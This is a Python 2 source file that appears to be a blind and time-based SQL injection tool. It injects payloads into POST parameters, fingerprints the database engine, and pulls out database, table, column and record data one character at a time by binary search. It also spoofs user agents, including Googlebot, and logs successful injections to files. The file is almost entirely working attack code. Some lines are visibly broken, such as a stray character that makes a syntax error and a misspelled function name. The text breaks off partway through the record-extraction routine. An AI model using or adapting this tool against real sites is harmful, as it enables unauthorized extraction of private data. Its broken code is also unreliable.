#!/usr/bin/env python
#coding:utf-8
import requests
from sys import argv, exit, stdout
from urllib import unquote
from HTMLParser import HTMLParser
from getopt import getopt, GetoptError
from time import sleep
from random import random
from random import randint
from random import choice
from os import getenv
from os import mkdir
from os.path import isdir
from os.path import isfile
import socks
###############################################################
## "errorbased" is a file which contains Error Based queries ##
###############################################################
import errorbased
import timebased

class Injection:
	Agentes={
		'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
		'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
		'iExplorer':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
		'Firefox':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
		'Safari':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
		'iPhone':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
		'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	}

	cabeceras={}
	proxy={} #if request need a proxy for connection it will be inside this variable
	cookies = {} #if request need coookies it will be inside this variable
	datos={} # Data parameteros for Post request
	method = -1 # True = Get method # False = Post method
	server = "" #URL string
	NoAleatorio = int(random()*100)
	BDatosName=[] # List with Databases name
	ColumName=[]  # List with Columns name
	TableName=[]
	##########################################################################
	##  Variables used to store all successfull queries and data extracted  ##
	##########################################################################
	reportDir = getenv("HOME")+"/sql/"# Directory path to create all data 	##
	succesfullQuery = "succes.lol"											##
	dataXtracted = "data.data"												##
	bdXtracted = "dbnames.data"												##
	hname= ""																## Hostname
	aData = ""																## Application name
	fullPath = ""															##
	Dbname = {'MySQL':[],'Postgres':[],'Oracle':[],'Mssql':[]}				##
	YaExiste = False														##
	##########################################################################
	#####################################################################
	##	Variables used for reuse prefix and suffix of previous Attack  ##
	#####################################################################
	newPrefix = ""
	newSuffix = ""
	prefixSuccess = ""
	suffixSuccess = ""
	Which = ""
	bases = []
	Flags={ ## This variable store succesfull injection queries
		'Generic':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'MySQL':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'Postgres':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'Mssql':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'Oracle':{'Prefijo':[],'Payload':[],'Sufijo':[]}
		}

	Prefijos = [" ","''","'", #Simple Quotes
				"')","'))","')))", #Simple Qulotes with Parentheses
				'"','""',
				'")','"))','")))',
				"%'",'%"' #Comodines
				]

	Comodin="_sqli_"

	Sufijos={
		#'MySQL':[' ','#','-- -a'," and '%'='"],
		'Generic':['--','-- -'+chr(randint(65,122))],
		'MySQL':['#','-- -'+chr(randint(65,122))],
		'Postgres':["-- -"+chr(randint(65,122)),';-- -'+chr(randint(65,122))],
		'Mssql':['-- -'+chr(randint(65,122))],
		'Oracle':['from dual;']
	}

	GoodRequest=0

					#######################################
					####   Queries loaded from files   ####
					#######################################
	PayloadsAttempt = 0
	PayloadsDBnames = 0 
	RegisterLength = 0
	TableLength = 0 
	TablesName = 0 
	ColumnLength = 0 
	ColumnNames= 0 
	numRegisters = 0
	RecordQuerys = 0
	TamrecordQuery = 0 

	notautos=['and 1=0-- -+']
	SentHeaders = ""
	respuesta = ""
	dataTempo = {}
	####
	dnames = False
	tnames = False
	cnames = False
	rnames = False
	####
	todasColumnas = False
	listaColumnas=[]
	####
	todasTablas = False
	listaTablas=""
	####
	todasBases = False
	listaBases = ""
	RelacionBaseTabla={}
	####
	Based = "Both"
	Time = 1.5
	dormir = "DOORMIR"
	verbosity = False


	def __init__(self):
		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setVerbosity(self,simon):
		self.verbosity = simon

	def searchDbname(self,Buscar):
		self.dnames = Buscar

	def searchTbname(self,Buscar):
		 self.tnames = Buscar

	def searchColumns(self,Buscar):
		 self.cnames = Buscar

	def searchRecords(self,Buscar):
		self.rnames = Buscar

	def setAgent(self,agent=""):
		if agent:
			self.cabeceras.update({'User-Agent':agent})
		else:
			self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})
		self.cabeceras.update({'Connection':'close'})

	def setServer(self,server):
		self.server = server

	def setCookie(self,galleta):
		galleta = galleta.split(';')
		for value in galleta:
			self.cookies.update({value.split('=')[0]:value.split('=')[1]})

	def setData(self,datosPagina):
		datosPagina = datosPagina.split('&')
		for parameter in datosPagina:
			self.datos.update({parameter.split('=')[0]:parameter.split('=')[1]})

	def setMethod(self,metodo):
		if metodo == 'get':
			self.method = True
		elif metodo == 'post':
			self.method = False
		else:
			print "Method not implemented"
	def setProxy(self,proxy):
		if proxy.split("://")[0] in ["http","ftp","https"]:
			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
		else:
			self.proxy = {"http":proxy}

	def setColumns(self,columnas):
		if columnas[0]=="all":
			self.todasColumnas = True
		else:
			self.todasColumnas = False
			self.columnasElegidas = columnas

	def setTables(self,tablas):
		if tablas[0] == "all":
			self.todasTablas = True
			#print "TAAAABLAS",tablas
		else:
			todasTablas = False
			self.listaTablas = tablas

	def setDBname(self,dbb):
		if dbb[0] == "all":
			self.todasBases = True
		else:
			self.todasBases = False
		self.listaBases = dbb
		print ":s",self.listaBases

	def setDBMS(self,which):
		self.Which = which

	def setBased(self,technique):
		self.Based = technique

	def setTime(self,ttime):
		self.Time = ttime

	def showCharacter(self,Character=""):
		#pass
		stdout.write("\033[1;36m"+Character+"\033[0m")
		stdout.flush()


	def PostInjection(self):
		#First try MySQL queries
		if self.Which.__len__()<1:
			self.bases = ('Generic','MySQL','Postgres','Mssql','Oracle')
		else:
			self.bases = self.Which.split()
		Ftime = True
		ans = False
		self.dataTempo = self.datos.copy()
		for dbms in self.bases:
			print "="*25,"",dbms," Begin ","="*25
			for pref in self.Prefijos:
				for payl in self.PayloadsAttempt.get(dbms):
					for suf in self.Sufijos.get(dbms):
						#print self.datos
						self.dataTempo = self.datos.copy()
						#query is a dictionary which contains the payloads append to original data
						query = self.ChangePhrase(DataPost=self.dataTempo,FirsTime=Ftime,pload="{0}{1}{2}".format(pref,payl.replace(self.dormir,str(self.Time)),suf))
						#sleep(0.09)
						#Attempt make a request to server with the sqli payload
						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
						Ftime=False
						# Imprimir Respuesta
						if self.Based == "time":
							#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
							cumple = (Attempt.content == self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) ))
						else:
							cumple = Attempt.content == self.GoodRequest.content
						if cumple:
							#After do a post request, prefix, payload and suffix will be storage in "Flags" variable
							self.Flags[dbms]['Prefijo'].append(pref)
							self.Flags[dbms]['Payload'].append(payl.replace(self.dormir,str(self.Time)))
							self.Flags[dbms]['Sufijo'].append(suf)
							#print "{0} {1} {2}".format(pref,payl.replace(self.dormir,str(self.Time)),suf)
							#print Attempt.content
							#print self.GoodRequest.content
							#exit(1)
						else:
							if "syntax" in Attempt.content:
								if not ans:
									print "\t\t\t\033[1;33m Page vulnerable to SQLi, sorry but this tool only works with Blind and Time sqli Based\033[0m"
									try:
										ans = self.Continue(raw_input("\033[1;34m Do you want continue [y/N] \033[0m").lower()[0])
									except:
										ans = self.Continue("")
									if ans:
										pass
									else:
										print "Bye"
										exit(1)
							pass
	#####################################	Printing Unsuccesfull queries ##########################################
			print "="*25,dbms," End ","="*25

# Question to user if he want to continue with attack
	def Continue(self,answer=""):
		try:
			if answer not in ('y','n'):
				answer = raw_input("\033[1;34m Do you want continue [y/N] \033[0m").lower()[0]
				self.Continue(answer)
			if answer == 'y':
				return True
			else:
				return False
		except:
			exit(1)

	# Cleaning duplicate values from Flags
	def rmDupValue(self):
		for dbms in self.bases:
			for field in ('Prefijo','Payload','Sufijo'):
				self.Flags[dbms][field] = list(set(self.Flags[dbms][field]))
	#####################################	Printing DBMS values ##########################################
	#Function used to determine DBMS
	def Whatis(self):
		tmp = 0
		for dbms in self.bases:
			tt = len(self.Flags[dbms]['Payload'])
			if  tt > tmp:
				tmp = tt
				self.Which = dbms
			elif tt == tmp:
				self.Which = "Unknown"

		if self.Which.__len__==0:
			print "Not vulnerable"
		else:
			print "DBMS detected \033[1;36m"+self.Which+"\033[0m"
			#print self.Flags
			for i in xrange(1):
				#print "\033[6;1;32mGREEN TEXT\033[0m"
				# Adding colors to Text
				try:
					ooo = "".join(("\033[1;36m"+"{0}={1}&").format(key, value) for key, value in self.datos.items())[:-1]
					self.prefixSuccess = choice(self.Flags[self.Which]['Prefijo'])
					self.suffixSuccess = choice(self.Flags[self.Which]['Sufijo'])
					#uuu = "\033[1;33m{0}\033[0m\033[5;32m{1}\033[0m\033[1;33m{2}\033[0m".format(choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Payload']),choice(self.Flags[self.Which]['Sufijo']))
					uuu = "\033[1;33m{0}\033[0m\033[5;32m{1}\033[0m\033[1;33m{2}\033[0m".format(self.prefixSuccess,choice(self.Flags[self.Which]['Payload']),self.suffixSuccess)
					ooo = ooo.replace(self.Comodin,uuu)
					self.showData(ooo,vulnerable=True,objeto=self.GoodRequest)
				except:
					self.showData("No vulnerable try another dbms",vulnerable=False)

	def showData(self,lll="",Previo=False,vulnerable=False,objeto=""):
		if Previo:
			try:
				previous = open(self.fullPath+"/"+self.succesfullQuery,"r").read()
				print "DBMS",previous.split(':::')[2],"\n"
				print "-"*56
				print ":"*20,"Data Requested",":"*20
				print "-"*56
				print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(previous.split(':::')[1],previous.split(':::')[0])
				print previous.split(':::')[5],"\033[0m\n"
			except:
				print "not vulnerable"
		else:
			print "-"*140
			print ":"*60,"Client Request",":"*60l
			print "-"*140
			#print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(self.GoodRequest.request.method,self.GoodRequest.request.path_url)
			# Cambiar objeto por self.GoodRequest
			print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(objeto.request.method,objeto.request.path_url)
			for h in objeto.request.headers: print "\033[1;35m"+h,":",objeto.request.headers.get(h)+"\033[0m"
			print "\n\033[1;36m",lll,"\033[0m\n\033[0m"
			print "-"*140
			print ":"*60,"Server Response",":"*60
			print "-"*140
			for i in objeto.headers: print "\033[1;35m"+i,":",objeto.headers.get(i)+"\033[0m"
			####
			## This section will write successfull data to file
			if vulnerable:# and Previo:
				if not Previo:
					try:
						sss = open(self.fullPath+"/"+self.succesfullQuery,"w")
																			#################################################
																			# 	Format to use when write in a file as csv 	#
																			#   url, method, dbms, prefix, sufix, request   #
																			#################################################
						sss.write("{0}:::{1}:::{2}:::{3}:::{4}:::{5}".format(self.GoodRequest.url.__str__(), self.GoodRequest.request.method, self.Which, self.prefixSuccess,self.suffixSuccess,lll))
						sss.close()
					except:
						print "Failed to write data in file"
			elif not vulnerable:
				print "Bye"
				exit(1)


	#Function used to replace value of variable Comodin (passphrase) with queries to detect a sqli
	def ChangePhrase(self,DataPost="",pload="",FirsTime=False,cAscii=0,offset=0,pos=0,dname=False,cant=False,longi=False,cname=False,tname=False,nombreBase="",nombreTabla="",reina="",records=False):
####################################################################################################################################################
		if FirsTime:
			#print "Primera vez ;)"
			lol = self.datos.copy()
			for param in lol.keys():
				if self.Comodin in lol.get(param):
					lol[param] = lol.get(param).replace(self.Comodin,"")
			self.GoodRequest = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=lol,proxies=self.proxy)
			#print "Original Request",lol
			#sleep(0.2)
####################################################################################################################################################			
		# Solo sustituye el valor para la cantidad de registros
		if cant:
		 	for parametro in DataPost.keys():
		 		if self.Comodin in DataPost.get(parametro):
		 			DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
		 	return DataPost
####################################################################################################################################################
		# Solo sustituye la longitud de un registro
		if longi:
			if tname: # Longitud de la cadena concatenada de las tablas
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,cAscii)
				return DataPost
			if cname:
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,nombreTabla,cAscii)
				return DataPost
			#Cambiar el offset y el código ascii para
			if records:
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(offset,cAscii)
				return DataPost
			else:
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
				return DataPost

####################################################################################################################################################
		# Sustituye el valor para de cada registros, la posición que va recorriendo de la cadena y su código ascii
		if dname:
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(pos,cAscii)
			#print "ñ.ñ",DataPost
			return DataPost
		#Sustituyendo para extraer el nombre de la base de datos
		if tname:
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,pos,cAscii)
			return DataPost
		if cname:
			if reina == 'Postgres':
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
				return DataPost
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,nombreTabla,pos,cAscii)
			return DataPost
		if records:
			#print "QUERY =>",pload
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(pos,cAscii)
			#print "ñ.ñ",DataPost
			return DataPost

		else:
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload)
			return DataPost

								#######################################
								## Hard methods to get database name ##
								##			  using 'and'			 ##
								#######################################

	def getDelimiters(self):
		try:
			#First we extract prefix and suffix storage in a text file used on previous information gathering
			fSuccess = open(self.fullPath+"/"+self.succesfullQuery,"r").read()
			self.Which = fSuccess.split(':::')[2]
			self.newPrefix = fSuccess.split(':::')[3]
			self.newSuffix = fSuccess.split(':::')[4]
		except:
			print "Target not vulnerable"
			exit(1)

										#####################
										## Guessing limits ##
										#####################

	def CantidadRegistros(self,ppload="",tb="",contador=0):
		liminf = 0
		limsup = 40
		medio = (liminf + limsup)//2
		found = False
		while True:
			self.dataTempo = self.datos.copy()
			query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppload,self.newSuffix),cant=True,cAscii=medio)
			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
			#print query
			#sleep(0.5)
			if self.Based == "time":
				lcumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
				#cumple = self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time) )
			else:
				cumple = Attempt.content == self.GoodRequest.content
			if found:
				break
			#if Attempt.content == self.GoodRequest.content:
			if cumple:
				#print "Menor"
				liminf = liminf
				limsup = medio
				medio = (liminf + limsup)//2
			#elif not(Attempt.content == self.GoodRequest.content):
			elif not cumple:
				#print "Mayor"
				liminf = medio
				limsup = limsup
				medio = (liminf + limsup)//2
			if limsup-1-liminf==0:
				found = True
			#sleep(0.3)
		return medio

	def LongitudRegistro(self,nr=0,lsup=200,tipo="",nbase="",ttname="",ppd="",ofset=0):
			liminf = 0
			limsup = lsup
			medio = (liminf + limsup)//2
			found = False
			kind = tipo
			while True:
				#print "LOL Time"
				#print "kind",kind
				self.dataTempo = self.datos.copy()
				if kind== "base":
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.RegisterLength.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,cAscii=medio)
				elif kind== "tablas":
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TableLength.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,tname=True,nombreBase=nbase,cAscii=medio)
				elif kind== "columna":
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.ColumnLength.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,cname=True,nombreBase=nbase,cAscii=medio,nombreTabla=ttname)
				elif kind == "Postgres":
					query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppd,self.newSuffix),longi=True,cAscii=medio,reina="Postgres")
				elif kind == "registros":
				 	query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppd.replace(self.dormir,str(self.Time)),self.newSuffix),longi=True,records=True,cAscii=medio,offset=ofset)
				#sleep(0.5)
				#print query
				#print ">>",self.newSuffix
				AttemptLongi = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
				if self.Based == "time":
					cumple = (AttemptLongi.content == self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < (AttemptLongi.elapsed.total_seconds()))#+ float(self.Time) ) )
					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),AttemptLongi.elapsed.total_seconds() + float(self.Time))
					#print "ORIGINAL:::    {0}\nAttempt::: {1}".format(self.GoodRequest.content,AttemptLongi.content)
					#cumple = (self.GoodRequest.elapsed.total_seconds() < AttemptLongi.elapsed.total_seconds()) and (AttemptLongi.content == self.GoodRequest.content)
				else:
					cumple = AttemptLongi.content == self.GoodRequest.content
				if found:
					return medio
				#if AttemptLongi.content == self.GoodRequest.content:
				if cumple:
					#print "menor"
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2

				#elif not(AttemptLongi.content == self.GoodRequest.content):
				elif not cumple:
					#print "Mayor"
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2

				if limsup-1-liminf==0:
					found = True

	def getPostDBnames(self):
		letra = ""
		letter = ""
		print "\n"*3
		print "="*25
		print "="*3,"Guessing DB Names","="*3
		print "="*25
		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="base")
		#print "Tamaño Base",tamanioRegistro
		letter = ""
		for posicion in xrange(1,tamanioRegistro+1):
			#print "LOL Time"
			liminf = 31 #48 because is number 0
			limsup = 127
			medio = (liminf + limsup)//2
			found = False
			while True:
				self.dataTempo = self.datos.copy()
				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.PayloadsDBnames.get(self.Which).replace(self.dormir,str(self.Time)),self.newSuffix),dname=True,pos=posicion,cAscii=medio)
				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
				if self.verbosity:
					self.showData(objeto=Attempt,vulnerable=True,lll=unlquote(repr(Attempt.request.body)))
				if self.Based == "time":
					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (self.GoodRequest.elapsed.total_seconds() + float(self.Time)) #(Attempt.elapsed.total_seconds())# + float(self.Time) )
					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
					cumple = (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.content == self.GoodRequest.content)
				else:
					cumple = Attempt.content == self.GoodRequest.content
				if found:
					if chr(medio) != "," and not self.verbosity:
						self.showCharacter(chr(medio))
					else:
						print ""
					#print chr(medio),
					#print "<<<<<<<<"
					letter+=chr(medio)
					#print letter
					break
				#if self.GoodRequest.content==Attempt.text:
				if cumple:
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2
				#elif not(Attempt.content == self.GoodRequest.content):
				elif not cumple:
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2
				if (limsup-liminf)-1==0:
					found = True
		self.BDatosName = letter.split(',')
		print ""
		if self.verbosity:
			for d in self.BDatosName: print "\033[1;36m"+d+"\033[0m"

	def getPostTables(self):
		print "\n"*3
		print "="*28
		print "="*3,"Guessing Tables Name","="*3
		print "="*28
		#sleep(3)
		tt = ""
		if self.Which == "Postgres": # Postgres se porta bien reina ¬¬
			tt += self.AuxiliarTablasPost()
			print "<"*30,tt
			self.RelacionBaseTabla["postgres"]=tt.split(',')
			print "="*80
			print "current_database() =>",self.RelacionBaseTabla["postgres"]
		else:
			if self.todasBases: #Cuando el usuario escribio all
				for ldbn in self.BDatosName:
					tt += self.AuxiliarTablasPost(ldbn)
					self.RelacionBaseTabla[ldbn]=tt.split(',')
					#print "="*80
					#print ldbn,"=>",self.RelacionBaseTabla[ldbn]
					print ""
			else:# Cuando el usuario escribe las bases de datos
				for ldbn in self.listaBases:
					tt += self.AuxiliarTablasPost(ldbn)
					self.RelacionBaseTabla[ldbn]=tt.split(',')
					#print "="*80
					#print ldbn,"=>",self.RelacionBaseTabla[ldbn]
					print ""
			if self.verbosity:
				for d in self.BDatosName: print "\033[1;36m"+d+"\033[0m"

	def AuxiliarTablasPost(self,ldbname=""):
		#print ldbname
		letter = ""
		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="tablas",nbase=ldbname)
		print "Checking",ldbname
		for posicion in xrange(1,tamanioRegistro+1):
			liminf = 31 #48 because is number 0
			limsup = 127
			medio = (liminf + limsup)//2
			found = False
			while True:
				self.dataTempo = self.datos.copy()
				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.TablesName.get(self.Which),self.newSuffix),tname=True,nombreBase=ldbname,pos=posicion,cAscii=medio)
				#print query
				#sleep(0.4)
				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
				if self.verbosity:
					self.showData(objeto=Attempt,Previo=False,lll=unquote(repr(Attempt.request.body)))
				if self.Based == "time":
					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
				else:
					cumple = Attempt.content == self.GoodRequest.content				

				if found:
					if chr(medio) != "," and not self.verbosity:
						self.showCharacter(chr(medio))
					else:
						print ""
					letter+=chr(medio)
					break
				#if self.GoodRequest.content==Attempt.text:
				if cumple:
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2
#				elif not(Attempt.content == self.GoodRequest.content):
				elif not cumple:
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2
				if (limsup-liminf)-1==0:
					found = True
		return letter

	def QueenPostgres(self):
		liminf = 48
		limsup = 127
		medio = (limsup+liminf)//2
		found = False
		oset = 0
		cc = 0
		lta = []
		print ">="*40,self.RelacionBaseTabla
		self.RelacionBaseTabla["postgres"] = self.listaTablas
		#Conociendo la cantidad de registros que tiene una tabla en postgres
		for t in self.RelacionBaseTabla["postgres"]:
			numr = self.CantidadRegistros(ppload="and(select count(column_name) from information_schema.columns where table_schema='public' and table_name='"+t+"') < {0}")
			cc+=1
			for oset in xrange(numr-1):
				letter=""
				tamanioRegistro = self.LongitudRegistro(nr=oset,ppd="and (select length((select column_name from information_schema.columns where table_schema='public' and table_name='"+t+"' limit 1 offset "+str(oset)+"))) < {0}",tipo="Postgres")
				for posicion in xrange(1,tamanioRegistro+1):
					self.dataTempo = self.datos.copy()
					liminf = 48
					limsup = 127
					medio = (limsup+liminf)//2
					letra = self.ColumnsPostgresTest(ind=posicion,linea=oset,tbn=t)
					letter+=letra
				lta.append(letter)
				self.listaColumnas.append(letter)
			print "="*20
			print "="*3,t,"="*3
			print "="*20
			for alt in self.listaColumnas: print ">"*3,alt," "*2,"<"*3

	def ColumnsPostgresTest(self,linea=0,ind=1,tbn=""):
		liminf = 48
		limsup = 127
		medio = (limsup + liminf)//2
		found = False
		while True:
			self.dataTempo = self.datos.copy()
			ntm = "and ascii(substring((select column_name from information_schema.columns where table_schema='public' and table_name='"+tbn+"' limit 1 offset "+str(linea)+" ),"+str(ind)+",1)) < {0}"
			#print ntm
			query = self.ChangePhrase(DataPost = self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ntm,self.newSuffix),cAscii=medio,reina="Postgres",cname=True)
			#print query
			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
			if self.Based == "time":
				cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
				#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
			else:
				cumple = Attempt.content == self.GoodRequest.content

			if found:

				return chr(medio)
			#if self.GoodRequest.content==Attempt.content:
			if cumple:
				liminf = liminf
				limsup = medio
				medio = (limsup + liminf)//2
			#elif not(Attempt.content==self.GoodRequest.content):
			elif not cumple:
				liminf = medio
				limsup = limsup
				medio = (limsup + liminf)//2
			if (limsup-liminf)-1==0:
				found = True

	def getPostColumns(self):
		letra = ""
		letter = ""
		print "\n"*3
		print "="*20
		print "="*3,"Getting Columns Name","="*3
		print "="*20
		sleep(3)
		if self.Which=='Postgres':
			self.QueenPostgres()
		else:
			tt = ""
			if self.todasTablas: #Cuando el usuario quiere obtener el nombre de las columnas para todas las tablas
				for ldbn in self.listaBases:
					self.listaColumnas=[]
					for TablaName in self.RelacionBaseTabla.get(ldbn):
						tt = ""
						tt += self.AuxiliarColumnasPost(ldbn,TablaName)
						self.listaColumnas = tt.split(',')
						print "="*20
						#print ldbn,"=>",TablaName,"=>>>>>>>",self.listaColumnas						
						#print "="*3,TablaName,"="*3
						#print "="*20
						#for alt in self.listaColumnas: print ">"*3,"\033[1;35m",alt,"\033[0m"
						print ""
			else: # Cuando quiere obtener las columnas de las tablas que el defina
				for ldbn in self.listaBases:
					for TablaName in self.listaTablas:
						#print "n.n",TablaName
						tt = ""
						tt += self.AuxiliarColumnasPost(ldbn,TablaName)
						self.listaColumnas = tt.split(',')
						#print "="*20
						#print ldbn,"=>",TablaName,"=>>>>>>>",self.listaColumnas						
						#print "="*3,TablaName,"="*3
						#print "="*20
						#for alt in self.listaColumnas: print ">"*3,"\033[1;35m",alt,"\033[0m"
						print ""

	def AuxiliarColumnasPost(self,ldbname="",tbname=""):
		#print ldbname
		letter = ""
		tamanioRegistro = self.LongitudRegistro(lsup=3000,tipo="columna",nbase=ldbname,ttname=tbname)
		#print ldbname,"=>",tbname
		for posicion in xrange(1,tamanioRegistro+1):
			liminf = 31 #48 because is number 0
			limsup = 127
			medio = (liminf + limsup)//2
			found = False
			while True:
				self.dataTempo = self.datos.copy()
				query = self.ChangePhrase(DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,self.ColumnNames.get(self.Which),self.newSuffix),cname=True,nombreBase=ldbname,pos=posicion,cAscii=medio,nombreTabla=tbname)
				#print query
				#sleep(0.4)
				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
				if self.Based == "time":
					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
				else:
					cumple = Attempt.content == self.GoodRequest.content				
				if found:
					if chr(medio) != "," and not self.verbosity:
						self.showCharacter(chr(medio))
					else:
						print ""
					letter+=chr(medio)
					break
				#if self.GoodRequest.content==Attempt.text:
				if cumple:
					liminf = liminf
					limsup = medio
					medio = (liminf + limsup)//2
				#elif not(Attempt.content == self.GoodRequest.content):
				elif not cumple:
					liminf = medio
					limsup = limsup
					medio = (liminf + limsup)//2
				if (limsup-liminf)-1==0:
					found = True
		return letter

	def getRowsRecords(self):
		print "\n"*3
		print "="*25
		print "="*3,"Getting Records","="*3
		print "="*25
		if self.todasColumnas:
			print self.listaColumnas
			for ldbn in self.listaBases: #Se recorre la lista que contiene las bases de datos
				for ttname in self.listaTablas: # Se recorre la lista que contiene las tablas deseadas
					for ccname in self.columnasElegidas:#Se recorre la lista que contiene las columnas a extraer
						#Cuenta cuantos registros tiene una columna
						#payload = self.numRegisters[self.Which]
						if self.Which=="Postgres":
							payload = self.numRegisters[self.Which].format("",ttname,"{0}")
						else:
							payload = self.numRegisters[self.Which].format(ldbn,ttname,"{0}")
						nr = self.CantidadRegistros(ppload=payload)
